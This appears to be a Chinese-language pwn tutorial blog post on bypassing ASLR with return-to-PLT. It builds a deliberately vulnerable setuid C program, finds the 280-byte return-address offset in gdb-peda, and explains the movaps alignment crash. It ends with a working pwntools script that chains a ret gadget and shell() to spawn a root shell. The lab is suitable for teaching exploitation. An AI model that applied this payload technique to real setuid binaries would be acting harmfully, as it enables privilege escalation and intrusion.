---
title: bypassaslr_1
date: 2018-05-21 16:30:00
tags: pwn
---

# 绕过ASLR--return2plt

## 编译代码

1. 源代码

   ```c
   #include<stdio.h>
   #include <string.h>
   /* Eventhough shell() function isnt invoked directly, its needed
      here since 'system@PLT' and 'exit@PLT' stub code should be pres
      ent in executable to successfully exploit it. */
   void shell() {
   	system("/bin/sh");
   	exit(0);
   }
   int main(int argc, char* argv[]) {
   	int i=0;
   	char buf[256];
   	read(0, buf, 500);
   	printf("%s\n",buf);
   	return 0;
   }
   ```

2. 编译命令

   ```shell
   #echo 2 > /proc/sys/kernel/randomize_va_space
   $gcc -g -fno-stack-protector -no-pie -o vuln vuln.c
   $sudo chown root vuln
   $sudo chgrp root vuln
   $sudo chmod +s vuln
   ```

<!-- more -->

## 调试代码

```
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x0000000000400470  _init
0x00000000004004a0  puts@plt
0x00000000004004b0  system@plt
0x00000000004004c0  read@plt
0x00000000004004d0  exit@plt
0x00000000004004e0  _start
0x0000000000400510  _dl_relocate_static_pie
0x0000000000400520  deregister_tm_clones
0x0000000000400550  register_tm_clones
0x0000000000400590  __do_global_dtors_aux
0x00000000004005c0  frame_dummy
0x00000000004005c7  shell
0x00000000004005e6  main
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

首先，我们找到shell函数的地址`0x00000000004005c7`

再找到ret地址的偏移:

```
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
gdb-peda$ r
Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%


Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x602260 --> 0x4173414125410a7f 
RDI: 0x1 
RBP: 0x3425416525414925 ('%IA%eA%4')
RSP: 0x7fffffffdd98 ("A%JA%fA%5A%KA%gA%6A%\n\177")
RIP: 0x400638 (<main+82>:	ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x4004e0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40062d <main+71>:	call   0x4004a0 <puts@plt>
   0x400632 <main+76>:	mov    eax,0x0
   0x400637 <main+81>:	leave  
=> 0x400638 <main+82>:	ret    
   0x400639:	nop    DWORD PTR [rax+0x0]
   0x400640 <__libc_csu_init>:	push   r15
   0x400642 <__libc_csu_init+2>:	push   r14
   0x400644 <__libc_csu_init+4>:	mov    r15,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd98 ("A%JA%fA%5A%KA%gA%6A%\n\177")
0008| 0x7fffffffdda0 ("5A%KA%gA%6A%\n\177")
0016| 0x7fffffffdda8 --> 0x7f0a25413625 
0024| 0x7fffffffddb0 --> 0x100008000 
0032| 0x7fffffffddb8 --> 0x4005e6 (<main>:	push   rbp)
0040| 0x7fffffffddc0 --> 0x0 
0048| 0x7fffffffddc8 --> 0xd10c02d6c0ba1de5 
0056| 0x7fffffffddd0 --> 0x4004e0 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400638 in main ()
gdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\n\177
A%JA%fA%5A%KA%gA%6A% found at offset: 280
```

现在构造payload如下:

> 'A' * 280 + shell_addr

测试一下:

```
tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c "print 'A' * 280 + '\xc7\x05\x40\x00\x00\x00\x00\x00'" > temp
```

我们发现，并没有给我们shell。

```
tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln
Catchpoint 1 (exec)
Reading symbols from vuln...(no debugging symbols found)...done.
gdb-peda$ r < temp
Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln < temp
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
[New process 87894]

Thread 2.1 "vuln" received signal SIGSEGV, Segmentation fault.
[Switching to process 87894]

[----------------------------------registers-----------------------------------]
RAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')
RBX: 0x0 
RCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')
RDX: 0x0 
RSI: 0x7ffff7dd16a0 --> 0x0 
RDI: 0x2 
RBP: 0x7fffffffdc58 --> 0x0 
RSP: 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 
RIP: 0x7ffff7a332f6 (<do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0)
R8 : 0x7ffff7dd1600 --> 0x0 
R9 : 0x0 
R10: 0x8 
R11: 0x246 
R12: 0x4006c4 --> 0x68732f6e69622f ('/bin/sh')
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a332e6 <do_system+1078>:	movq   xmm0,QWORD PTR [rsp+0x8]
   0x7ffff7a332ec <do_system+1084>:	mov    QWORD PTR [rsp+0x8],rax
   0x7ffff7a332f1 <do_system+1089>:	movhps xmm0,QWORD PTR [rsp+0x8]
=> 0x7ffff7a332f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7ffff7a332fb <do_system+1099>:	call   0x7ffff7a23110 <__GI___sigaction>
   0x7ffff7a33300 <do_system+1104>:	lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>
   0x7ffff7a33307 <do_system+1111>:	xor    edx,edx
   0x7ffff7a33309 <do_system+1113>:	mov    edi,0x3
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 
0008| 0x7fffffffdc00 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')
0016| 0x7fffffffdc08 --> 0x0 
0024| 0x7fffffffdc10 --> 0x0 
0032| 0x7fffffffdc18 --> 0x7ffff7a33360 (<cancel_handler>:	push   rbx)
0040| 0x7fffffffdc20 --> 0x7fffffffdc14 --> 0xf7a3336000000000 
0048| 0x7fffffffdc28 --> 0x0 
0056| 0x7fffffffdc30 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff7a332f6 in do_system (line=0x4006c4 "/bin/sh") at ../sysdeps/posix/system.c:125
125	../sysdeps/posix/system.c: No such file or directory.
```

卡在这个地方:

```
0x7ffff7a332f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
```

这是因为movaps需要我们的rsp地址对齐到16字节。

当前rsp的值:

```
RSP: 0x7fffffffdbf8
```

知道原因后，我们可以重新构造如下payload:

> 'A' * 280 + ret_addr + shell_addr

脚本如下:

```python
from pwn import *

# 'A' * 280 + ret_addr + shell_addr
payload = 'A' * 280 + '\x38\x06\x40\x00\x00\x00\x00\x00' + '\xc7\x05\x40\x00\x00\x00\x00\x00'

io = process("./vuln")
io.sendline(payload)
io.interactive()
```



